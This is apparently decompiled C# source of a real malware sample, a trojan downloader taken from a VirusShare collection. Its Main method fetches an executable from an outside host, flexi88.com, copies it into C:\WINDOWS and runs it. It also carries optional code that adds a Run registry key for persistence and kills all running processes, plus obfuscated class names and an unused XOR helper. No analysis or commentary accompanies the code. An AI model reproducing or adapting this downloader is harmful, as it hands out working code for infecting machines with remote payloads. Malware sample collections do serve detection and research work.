// Decompiled with JetBrains decompiler
// Type: YVDiaECzgUPSOGoLysWBNqcf40.YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192
// Assembly: dgm.exe-DL, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56903E42-D1E4-4DF5-84C6-B8EFCD9DAD4F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Downloader.MSIL.Tiny.z-336f134c1cc5ae67798359329eb0d7298dee2bde2870e1473274fedb2d579c39.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace YVDiaECzgUPSOGoLysWBNqcf40
{
  internal class YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192 : Form
  {
    private static string url = "http://flexi88.com/11/dgm.exe";
    private static string file = "dgm.exe";
    private static string dest = "C:\\WINDOWSdgm.exe";
    private static bool blnCopy = true;
    private static bool blnExecute = true;
    private static bool blnReboot = false;
    private static bool blnStartup = false;

    public string XOR(string textToEncrypt, int key)
    {
      StringBuilder stringBuilder1 = new StringBuilder(textToEncrypt);
      StringBuilder stringBuilder2 = new StringBuilder(textToEncrypt.Length);
      for (int index = 0; index < textToEncrypt.Length; ++index)
      {
        char ch = (char) ((uint) stringBuilder1[index] ^ (uint) key);
        stringBuilder2.Append(ch);
      }
      return stringBuilder2.ToString();
    }

    private static void Main(string[] args)
    {
      try
      {
        if (System.IO.File.Exists(YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file))
          System.IO.File.Delete(YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file);
        new WebClient().DownloadFile(YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.url, YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file);
        if (YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.blnCopy)
        {
          System.IO.File.Copy(YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file, YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.dest, true);
          System.IO.File.Delete(YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file);
        }
        if (YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.blnExecute)
          new Process()
          {
            StartInfo = {
              FileName = YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.dest
            }
          }.Start();
        if (YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.blnStartup)
        {
          string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
          if ((string) Registry.GetValue(keyName, YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file, (object) YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file) == YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file)
            Registry.SetValue(keyName, YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.file, (object) YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.dest);
        }
        if (!YVDiaECzgUPSOGoLysWBNqcf40YVDiaECzgUPSOGoLysWBNqcf192.blnReboot)
          return;
        try
        {
          foreach (Process process in Process.GetProcesses())
            process.Kill();
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
      }
    }
  }
}
